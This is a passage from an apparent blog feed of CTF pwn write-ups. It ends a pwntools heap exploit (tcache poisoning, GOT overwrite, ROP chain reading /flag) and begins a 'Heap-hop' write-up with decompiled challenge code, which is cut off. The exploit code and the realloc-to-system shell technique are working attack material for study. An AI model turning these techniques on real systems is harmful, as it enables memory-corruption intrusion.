        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Option: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Write me the new contents of your book that is no longer than what it was before.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Option: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

    <span class="k">def</span> <span class="nf">heapLeak</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Option: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1337&#34;</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;What is your favourite number? &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;You found a secret message: &#34;</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">HEAP_OFFT</span>

    <span class="k">def</span> <span class="nf">enable_print</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
        <span class="n">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>
            <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
        <span class="p">]))</span>

    <span class="k">def</span> <span class="nf">libc_leak_free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Option: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="n">STDOUT</span>

    <span class="k">def</span> <span class="nf">leak_environ</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Option: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>

    <span class="n">init</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;m&#34;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x41</span><span class="p">))</span>

    <span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;K&#34;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
    <span class="n">heap_leak</span> <span class="o">=</span> <span class="n">heapLeak</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="c1"># victim</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>   <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">,</span>
                        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="c1"># prev_sz</span>
                        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="c1"># fake size</span>
                    <span class="p">]))</span>
    
    <span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>   <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">,</span>
                        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="c1"># prev_sz</span>
                        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="c1"># fake size</span>
                    <span class="p">]))</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="c1"># count for 0x40 tcachebin = 1</span>

    <span class="c1"># chunk2 =&gt; sz extended</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;K&#34;</span><span class="o">*</span><span class="mh">0x20</span><span class="p">)</span>
    <span class="c1"># chunk2 =&gt; tcachebin 0x40, count = 2</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

    <span class="c1"># oob write over chunk3, we keep valid header</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>   <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="p">,</span>
                        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span> <span class="c1"># valid size to end up in the 0x40 tcache bin</span>
                    <span class="p">]))</span> <span class="c1"># count = 1</span>

    <span class="c1"># chunk3 =&gt; 0x40 tcachebin, count = 2</span>
    <span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Encrypted fp: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">encode_ptr</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">,</span> <span class="n">CHUNK3_OFFT</span><span class="p">,</span> <span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">printf</span><span class="p">))</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="c1"># tcache poisoning</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>   <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="p">,</span>
                         <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x41</span><span class="p">),</span> <span class="c1"># valid size</span>
                         <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">encode_ptr</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">,</span> <span class="n">CHUNK3_OFFT</span><span class="p">,</span> <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">books</span><span class="p">))</span> <span class="c1"># forward ptr</span>
                     <span class="p">]))</span>

    <span class="c1"># dumb</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x20</span><span class="p">)</span> <span class="c1"># count = 1</span>

    <span class="c1"># arbitrary write to @books, this way books[1] is user controlled</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">),</span> <span class="c1"># sz</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">books</span><span class="p">),</span> <span class="c1"># target</span>
        <span class="sa">b</span><span class="s2">&#34;P&#34;</span><span class="o">*</span><span class="mh">0x10</span>
    <span class="p">]))</span> <span class="c1"># count = 0</span>

    <span class="c1"># we can write way more due to the previous call</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">flat</span><span class="p">([</span>
            <span class="c1"># 1==</span>
            <span class="mh">0xff</span><span class="p">,</span> <span class="c1"># sz</span>
            <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">stdout</span><span class="p">,</span> <span class="c1"># target</span>
            <span class="c1"># 2==</span>
            <span class="mh">0x8</span><span class="p">,</span> <span class="c1"># sz</span>
            <span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">free</span><span class="p">,</span> <span class="c1"># target</span>
            <span class="c1"># 3==</span>
            <span class="mh">0x8</span><span class="p">,</span> <span class="c1"># sz</span>
            <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">secret_msg</span><span class="p">,</span> <span class="c1"># target</span>
            <span class="c1"># 4==</span>
            <span class="mh">0xff</span><span class="p">,</span> <span class="c1"># sz</span>
            <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">books</span> <span class="c1"># target</span>
        <span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mh">0x60</span><span class="p">,</span> <span class="n">filler</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
    
    <span class="c1"># free@got =&gt; puts</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>
            <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">puts</span><span class="p">)</span>
        <span class="p">]))</span>
    
    <span class="c1"># can print = true</span>
    <span class="n">enable_print</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

    <span class="c1"># libc leak</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak_free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="c1"># leak stack (environ)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">flat</span><span class="p">([</span>
            <span class="c1"># 1==</span>
            <span class="mh">0xff</span><span class="p">,</span> <span class="c1"># sz</span>
            <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">environ</span> <span class="c1"># target</span>
        <span class="p">],</span> <span class="n">filler</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>

    <span class="n">environ</span> <span class="o">=</span> <span class="n">leak_environ</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;environ: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="n">stackframe_rewrite</span> <span class="o">=</span> <span class="n">environ</span> <span class="o">-</span> <span class="mh">0x150</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stackframe_rewrite: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stackframe_rewrite</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="n">rop</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">,</span> <span class="n">base</span><span class="o">=</span><span class="n">stackframe_rewrite</span><span class="p">)</span>

    <span class="c1"># setup the write to the rewrite stackframe</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">flat</span><span class="p">([</span>
            <span class="c1"># 1==</span>
            <span class="mh">0xff</span><span class="p">,</span> <span class="c1"># sz</span>
            <span class="n">stackframe_rewrite</span> <span class="c1"># target</span>
        <span class="p">],</span> <span class="n">filler</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>

    <span class="c1"># ROPchain</span>
    <span class="n">rop</span><span class="p">(</span><span class="n">rax</span><span class="o">=</span><span class="n">pwn</span><span class="o">.</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_open</span><span class="p">,</span> <span class="n">rdi</span><span class="o">=</span><span class="n">stackframe_rewrite</span> <span class="o">+</span> <span class="mh">0xde</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="n">rsi</span><span class="o">=</span><span class="n">pwn</span><span class="o">.</span><span class="n">constants</span><span class="o">.</span><span class="n">O_RDONLY</span><span class="p">)</span> <span class="c1"># open</span>
    <span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s2">&#34;syscall&#34;</span><span class="p">,</span> <span class="s2">&#34;ret&#34;</span><span class="p">]))</span>
    <span class="n">rop</span><span class="p">(</span><span class="n">rax</span><span class="o">=</span><span class="n">pwn</span><span class="o">.</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_read</span><span class="p">,</span> <span class="n">rdi</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="n">rsi</span><span class="o">=</span><span class="n">heap_leak</span><span class="p">,</span> <span class="n">rdx</span><span class="o">=</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1"># file descriptor bf ...</span>
    <span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s2">&#34;syscall&#34;</span><span class="p">,</span> <span class="s2">&#34;ret&#34;</span><span class="p">]))</span>

    <span class="n">rop</span><span class="p">(</span><span class="n">rax</span><span class="o">=</span><span class="n">pwn</span><span class="o">.</span><span class="n">constants</span><span class="o">.</span><span class="n">SYS_write</span><span class="p">,</span> <span class="n">rdi</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">rsi</span><span class="o">=</span><span class="n">heap_leak</span><span class="p">,</span> <span class="n">rdx</span><span class="o">=</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1"># write</span>
    <span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s2">&#34;syscall&#34;</span><span class="p">,</span> <span class="s2">&#34;ret&#34;</span><span class="p">]))</span>
    <span class="n">rop</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mh">0x1337</span><span class="p">)</span>
    <span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/flag</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
    <span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>

    <span class="c1"># write and trigger the ROPchain</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
    
    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">exp</span><span class="p">()</span>
</code></pre></div>]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[pwnme 2023 - pwn] Heap-hop]]></title>
            <link href="https://nasm.re/posts/heaphop/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/heaphop/</id>
            
            <published>2023-05-07T00:00:00+00:00</published>
            <updated>2023-05-07T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h2 id="heap-hop">
        Heap-Hop
        <a data-clipboard-text="https://nasm.re/posts/heaphop/#heap-hop" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Heap-Hop" href="#heap-hop">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<blockquote>
<p>Solves: 31  Medium</p>
<p>Heap exploitation is cool, and the best is when no free is used. &gt;Try to pwn the challenge and get the flag remotely.</p>
<p><strong>Note</strong>:</p>
<ul>
<li><em>You must spawn an instance to solve this challenge. You can connect to it with netcat: nc IP PORT</em></li>
</ul>
<p>Author: Express#8049</p>
<p>Remote service at : nc 51.254.39.184 1336</p>
</blockquote>
<p>Heap-hop is a heap exploitation challenge I did during the <a
  class="gblog-markdown__link"
  href="https://pwnme.fr/"
  
  >pwnme CTF</a
>. It involved classic tricks like tcache poisoning and GOT hiijacking. You can find the related files <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/tree/master/2023/pwnme/pwn/heap"
  
  >here</a
>.</p>
<div class="gblog-post__anchorwrap">
    <h3 id="tldr">
        TL;DR
        <a data-clipboard-text="https://nasm.re/posts/heaphop/#tldr" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor TL;DR" href="#tldr">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h3>
</div>
<ul>
<li>Setup heap layout</li>
<li>fill tcachebin for 0x400 sized chunks</li>
<li>free large 0x400 sized chunk to get libc addresses</li>
<li>oob read onto the chunk right before the large freed chunk =&gt; libc leak</li>
<li>request a small 0x20 sized chunk that gets free right after, it falls at the begin of the chunk in the unsortedbin, oob read like just before =&gt; heap leak.</li>
<li>tcache poisoning (we&rsquo;re able to deal with safe-linking given we leaked heap)</li>
<li>With the help of tcache poisoning, overwrite <code>realloc@got</code> to write <code>&amp;system</code></li>
<li><code>realloc(&quot;/bin/sh&quot;)</code> is then <code>system(&quot;/binb/sh&quot;)</code></li>
</ul>
<div class="gblog-post__anchorwrap">
    <h2 id="what-we-have">
        What we have
        <a data-clipboard-text="https://nasm.re/posts/heaphop/#what-we-have" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor What we have" href="#what-we-have">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<pre tabindex="0"><code>$ checksec --file ./heap-hop
[*] '/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/pwnme/pwn/heap/heap-hop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'/home/nasm/Documents/pwn/pwnme/heap'
$ ./libc.so.6 
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 11.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
</code></pre><p>What we can see is that a recent libc is provided (which means with safe-linking) and that the binary isn&rsquo;t PIE.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="code-review">
        Code review
        <a data-clipboard-text="https://nasm.re/posts/heaphop/#code-review" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Code review" href="#code-review">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Here is basically the main logic of the binary:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">input_int</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]
</span><span class="c1"></span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[+] Welcome to hip-hop, you can create and listen to heap-hop music&#34;</span><span class="p">);</span>
  <span class="k">do</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="s">&#34;Make your choice :</span><span class="se">\n\t</span><span class="s">- 1. Create a track.</span><span class="se">\n\t</span><span class="s">- 2. Read a track.</span><span class="se">\n\t</span><span class="s">- 3. Edit a track.</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
    <span class="n">input_int</span> <span class="o">=</span> <span class="n">read_input_int</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">input_int</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">handle_edit</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">input_int</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="p">)</span>
        <span class="k">goto</span> <span class="n">LABEL_10</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">input_int</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">handle_create</span><span class="p">();</span>
        <span class="k">continue</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">input_int</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">)</span>
        <span class="n">handle_read</span><span class="p">();</span>
      <span class="k">else</span>
<span class="nl">LABEL_10</span><span class="p">:</span>
        <span class="n">quit</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">while</span> <span class="p">(</span> <span class="n">quit</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">);</span>
  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[?] Goodbye.&#34;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>Basic layout for a heap exploitation challenge, we&rsquo;re allowed to create, read and edit a given track. As we already read in the initial statement we apparently cannot free a track.</p>
<p>Let&rsquo;s first take a look at the create function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">handle_create</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rdx
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h] BYREF
</span><span class="c1"></span>  <span class="n">chunk_t</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the tracklist ID</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mh">0x100</span> <span class="p">)</span>
